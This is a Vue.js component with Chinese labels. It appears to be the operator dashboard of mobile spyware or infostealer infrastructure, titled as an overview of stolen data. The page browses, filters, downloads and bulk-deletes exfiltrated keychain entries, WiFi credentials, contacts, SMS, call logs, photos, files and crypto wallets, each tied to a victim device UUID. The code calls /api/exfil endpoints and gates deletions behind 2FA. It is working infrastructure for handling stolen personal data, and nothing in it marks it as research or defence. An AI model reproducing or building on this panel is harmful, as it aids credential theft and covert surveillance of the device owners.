<template>
  <div class="exfil-page">
    <el-row :gutter="12" style="margin-bottom:16px;">
      <el-col :span="3" v-for="c in categories" :key="c.key">
        <div class="stat-card" :style="{ background: c.grad }" @click="filters.category = c.key; loadList()">
          <div style="display:flex;align-items:center;justify-content:space-between;">
            <div>
              <div class="stat-label" style="font-size:12px;opacity:0.85;">{{ c.label }}</div>
              <div class="stat-value" style="font-size:22px;font-weight:700;">{{ counts[c.key] || 0 }}</div>
            </div>
            <el-icon :size="32" style="opacity:0.3;"><component :is="c.icon" /></el-icon>
          </div>
        </div>
      </el-col>
    </el-row>

    <div class="page-card">
      <div class="page-header">
        <div>
          <div class="page-title">窃取数据总览</div>
          <div class="page-subtitle">按设备 / 分类 / 时间筛选数据</div>
        </div>
      </div>

      <div class="filter-bar">
        <el-select v-model="filters.category" placeholder="分类" clearable style="width:160px;" @change="loadList">
          <el-option v-for="c in categories" :key="c.key" :label="c.label" :value="c.key" />
        </el-select>
        <el-input v-model="filters.device_uuid" placeholder="设备 UUID" clearable style="width:240px;" @clear="loadList" @keyup.enter="loadList">
          <template #prefix><el-icon><Iphone /></el-icon></template>
        </el-input>
        <el-date-picker
          v-model="filters.dateRange"
          type="daterange"
          range-separator="至"
          start-placeholder="开始日期"
          end-placeholder="结束日期"
          value-format="YYYY-MM-DD"
          style="width:280px;"
        />
        <el-input v-model="filters.q" placeholder="搜索关键字" clearable style="width:220px;" @clear="loadList" @keyup.enter="loadList" />
        <el-button type="primary" @click="loadList">
          <el-icon><Search /></el-icon>
          <span>查询</span>
        </el-button>
        <el-button @click="resetFilters">重置</el-button>
        <el-button
          type="danger"
          plain
          :disabled="selectedIds.length === 0"
          @click="batchDeleteSelected"
          style="margin-left:8px;"
        >
          <el-icon><Delete /></el-icon>
          <span>批量删除 ({{ selectedIds.length }})</span>
        </el-button>
        <el-button type="danger" @click="deleteAllFiltered" style="margin-left:4px;">
          <el-icon><Delete /></el-icon>
          <span>清理全部筛选结果</span>
        </el-button>
      </div>

      <el-table :data="list" stripe @selection-change="onSelectionChange" ref="tableRef">
        <el-table-column type="selection" width="50" />
        <el-table-column prop="category" label="分类" width="110">
          <template #default="{ row }">
            <el-tag size="small" :type="catType(row.category)" effect="plain">{{ catLabel(row.category) }}</el-tag>
          </template>
        </el-table-column>
        <el-table-column prop="device_uuid" label="设备 UUID" width="160">
          <template #default="{ row }">
            <span class="mono text-muted" :title="row.device_uuid">{{ shortUuid(row.device_uuid) }}</span>
          </template>
        </el-table-column>
        <el-table-column prop="file_name" label="文件名" show-overflow-tooltip>
          <template #default="{ row }">
            <el-icon style="color:#409eff;"><Document /></el-icon>
            <span style="margin-left:6px;">{{ row.file_name || row.title || '-' }}</span>
          </template>
        </el-table-column>
        <el-table-column prop="mime_type" label="类型" width="110" />
        <el-table-column prop="size" label="大小" width="100">
          <template #default="{ row }">{{ formatSize(row.size) }}</template>
        </el-table-column>
        <el-table-column prop="created_at" label="窃取时间" width="170">
          <template #default="{ row }">
            <span class="text-muted">{{ formatDate(row.created_at) }}</span>
          </template>
        </el-table-column>
        <el-table-column label="操作" width="180" fixed="right">
          <template #default="{ row }">
            <el-button type="primary" link size="small" @click="goDevice(row)">设备</el-button>
            <el-button type="success" link size="small" @click="downloadRow(row)">下载</el-button>
            <el-button type="danger" link size="small" @click="deleteRow(row)">删除</el-button>
          </template>
        </el-table-column>
      </el-table>

      <el-pagination
        v-model:current-page="page"
        v-model:page-size="pageSize"
        :page-sizes="[20, 50, 100, 200]"
        :total="total"
        layout="total, sizes, prev, pager, next"
        background
        @current-change="loadList"
        @size-change="loadList"
      />
    </div>
  </div>
</template>

<script setup>
import { ref, reactive, onMounted } from 'vue'
import { useRouter } from 'vue-router'
import { ElMessage, ElMessageBox } from 'element-plus'
import {
  Key, Connection, Phone, ChatDotRound, PhoneFilled, PictureFilled, Folder, Wallet, Search, Document, Iphone, Delete
} from '@element-plus/icons-vue'
import axios from '../utils/axios'
import { formatDate, shortUuid, require2FA } from '../utils/twofa'

const router = useRouter()
const list = ref([])
const total = ref(0)
const page = ref(1)
const pageSize = ref(20)
const filters = reactive({ category: '', device_uuid: '', dateRange: [], q: '' })
const counts = reactive({ keychain: 0, wifi: 0, contacts: 0, sms: 0, calls: 0, photos: 0, files: 0, wallets: 0 })
const selectedIds = ref([])
const tableRef = ref(null)

const categories = [
  { key: 'keychain', label: 'Keychain', icon: Key, grad: 'linear-gradient(135deg,#409eff,#66b1ff)' },
  { key: 'wifi', label: 'WiFi', icon: Connection, grad: 'linear-gradient(135deg,#67c23a,#85ce61)' },
  { key: 'contacts', label: '通讯录', icon: Phone, grad: 'linear-gradient(135deg,#e6a23c,#ebb563)' },
  { key: 'sms', label: '短信', icon: ChatDotRound, grad: 'linear-gradient(135deg,#f56c6c,#f78989)' },
  { key: 'calls', label: '通话', icon: PhoneFilled, grad: 'linear-gradient(135deg,#909399,#a6a9ad)' },
  { key: 'photos', label: '照片', icon: PictureFilled, grad: 'linear-gradient(135deg,#9b59b6,#bb8fce)' },
  { key: 'files', label: '文件', icon: Folder, grad: 'linear-gradient(135deg,#16a085,#48c9b0)' },
  { key: 'wallets', label: '钱包', icon: Wallet, grad: 'linear-gradient(135deg,#d35400,#e67e22)' }
]

const catMap = Object.fromEntries(categories.map(c => [c.key, c.label]))
const catTypeMap = { keychain: 'primary', wifi: 'success', contacts: 'warning', sms: 'danger', calls: 'info', photos: '', files: 'success', wallets: 'warning' }

function catLabel(k) { return catMap[k] || k }
function catType(k) { return catTypeMap[k] || 'info' }

function resetFilters() {
  filters.category = ''
  filters.device_uuid = ''
  filters.dateRange = []
  filters.q = ''
  page.value = 1
  loadList()
}

function formatSize(s) {
  if (!s) return '-'
  if (s < 1024) return s + ' B'
  if (s < 1024 * 1024) return (s / 1024).toFixed(1) + ' KB'
  if (s < 1024 * 1024 * 1024) return (s / 1024 / 1024).toFixed(1) + ' MB'
  return (s / 1024 / 1024 / 1024).toFixed(2) + ' GB'
}

function goDevice(row) {
  if (row.device_uuid) router.push(`/devices/${row.device_uuid}`)
}

async function downloadRow(row) {
  try {
    const token = localStorage.getItem('token') || ''
    const url = token
      ? `/api/exfil/${row.id}/download?token=${encodeURIComponent(token)}`
      : `/api/exfil/${row.id}/download`
    window.open(url, '_blank')
  } catch (err) {
    const msg = err?.message || '下载失败'
    ElMessage.error(msg)
  }
}

function onSelectionChange(rows) {
  selectedIds.value = (rows || []).map(r => r.id).filter(id => id != null)
}

async function deleteRow(row) {
  try {
    await ElMessageBox.confirm('确认删除该数据？此操作不可恢复。', '删除', { type: 'warning' })
    const otp = await require2FA('delete exfil')
    if (otp === false) return
    const params = {}
    if (otp) params.otp_code = otp
    await axios.delete(`/api/exfil/${row.id}`, { params })
    ElMessage.success('已删除')
    loadList()
    loadCounts()
  } catch (err) {
    if (err !== 'cancel' && err !== 'close') {
      const msg = err?.response?.data?.detail || err?.message || '删除失败'
      ElMessage.error(msg)
    }
  }
}

async function batchDeleteSelected() {
  if (selectedIds.value.length === 0) {
    ElMessage.warning('请先勾选要删除的数据')
    return
  }
  try {
    await ElMessageBox.confirm(
      `确认删除已勾选的 ${selectedIds.value.length} 条数据？此操作不可恢复。`,
      '批量删除',
      { type: 'warning' }
    )
    const otp = await require2FA('batch delete exfil')
    if (otp === false) return
    const params = {}
    if (otp) params.otp_code = otp
    const res = await axios.post('/api/exfil/batch_delete', {
      ids: [...selectedIds.value],
      all_filtered: false
    }, { params })
    const msg = res.data?.message || `已删除 ${res.data?.deleted || 0} 条`
    ElMessage.success(msg)
    selectedIds.value = []
    if (tableRef.value && tableRef.value.clearSelection) tableRef.value.clearSelection()
    loadList()
    loadCounts()
  } catch (err) {
    if (err !== 'cancel' && err !== 'close') {
      const msg = err?.response?.data?.detail || err?.message || '批量删除失败'
      ElMessage.error(msg)
    }
  }
}

async function deleteAllFiltered() {
  try {
    const hasFilter = filters.category || filters.device_uuid || filters.q || (filters.dateRange && filters.dateRange.length === 2)
    let hint = hasFilter ? '将删除当前筛选条件下的全部窃取数据。' : '当前未设置筛选条件，将删除所有窃取数据！'
    await ElMessageBox.confirm(
      `${hint}\n确认继续？此操作不可恢复。`,
      '清理全部筛选结果',
      { type: 'warning', dangerouslyUseHTMLString: false }
    )
    const otp = await require2FA('delete all filtered exfil')
    if (otp === false) return
    const params = {}
    if (otp) params.otp_code = otp
    const body = { all_filtered: true }
    if (filters.category) body.category = filters.category
    if (filters.device_uuid) body.device_uuid = filters.device_uuid
    if (filters.q) body.search = filters.q
    if (filters.dateRange && filters.dateRange.length === 2) {
      body.start_date = filters.dateRange[0]
      body.end_date = filters.dateRange[1]
    }
    const res = await axios.post('/api/exfil/batch_delete', body, { params })
    const msg = res.data?.message || `已删除 ${res.data?.deleted || 0} 条`
    ElMessage.success(msg)
    selectedIds.value = []
    if (tableRef.value && tableRef.value.clearSelection) tableRef.value.clearSelection()
    loadList()
    loadCounts()
  } catch (err) {
    if (err !== 'cancel' && err !== 'close') {
      const msg = err?.response?.data?.detail || err?.message || '清理失败'
      ElMessage.error(msg)
    }
  }
}

async function loadList() {
  try {
    const params = {
      skip: (page.value - 1) * pageSize.value,
      limit: pageSize.value,
      category: filters.category || undefined,
      device_uuid: filters.device_uuid || undefined,
      search: filters.q || undefined,
    }
    const res = await axios.get('/api/exfil', { params })
    const raw = res.data?.items || res.data || []
    list.value = raw.map(r => {
      const filePath = r.file_name || r.path || ''
      const baseName = filePath ? String(filePath).split(/[\\/]/).pop() : (r.title || '')
      const ext = baseName ? (baseName.includes('.') ? baseName.split('.').pop() : '') : ''
      return {
        ...r,
        file_name: r.file_name || baseName,
        size: r.size != null ? r.size : r.file_size,
        mime_type: r.mime_type || (ext ? ext.toUpperCase() : ''),
        created_at: r.created_at || r.uploaded_at,
      }
    })
    total.value = res.data?.total ?? list.value.length
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '列表加载失败'
    ElMessage.error(msg)
    list.value = []
    total.value = 0
  }
}

async function loadCounts() {
  try {
    const res = await axios.get('/api/exfil/stats')
    const by = res.data?.by_category || res.data || {}
    counts.keychain = by.keychain || 0
    counts.wifi = by.wifi || 0
    counts.contacts = by.contacts || 0
    counts.sms = by.sms || 0
    counts.calls = by.calls || 0
    counts.photos = by.photos || 0
    counts.files = by.files || 0
    counts.wallets = by.wallets || 0
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '分类统计加载失败'
    ElMessage.error(msg)
    counts.keychain = 0
    counts.wifi = 0
    counts.contacts = 0
    counts.sms = 0
    counts.calls = 0
    counts.photos = 0
    counts.files = 0
    counts.wallets = 0
  }
}

onMounted(() => {
  loadCounts()
  loadList()
})
</script>

<style scoped>
.stat-card {
  padding: 16px;
  color: #fff;
  border-radius: 8px;
  cursor: pointer;
  transition: transform 0.15s;
}
.stat-card:hover { transform: translateY(-2px); }
</style>
